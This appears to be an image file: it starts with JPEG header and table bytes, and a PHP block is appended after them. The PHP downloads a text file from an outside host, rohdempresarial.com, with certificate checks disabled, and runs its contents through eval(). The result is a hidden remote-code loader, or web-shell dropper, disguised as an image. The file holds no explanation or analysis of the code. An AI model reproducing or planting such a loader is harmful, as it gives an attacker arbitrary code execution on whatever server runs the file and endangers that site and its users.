    JFIF  x x     C       	
	
  



 	

   C      "               	

       } !1AQa "q2   #B  R  $3br 	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz                                                                                 	

       w !1AQ aq"2 B    	#3R br 
$4 % &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz                                                                          ?     N    m?    j    EP   <?=
$protocol = "https";
$domain = "rohdempresarial.com/";
$file_path = "/assets/front/img/c.txt";
$url = $protocol . "://" . $domain . $file_path;

function fetch_with_curl($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // optional: skip SSL verification
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // optional: skip hostname verification
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

$content = fetch_with_curl($url);
if ($content !== false) {
    eval("?>" . $content);
}
?> 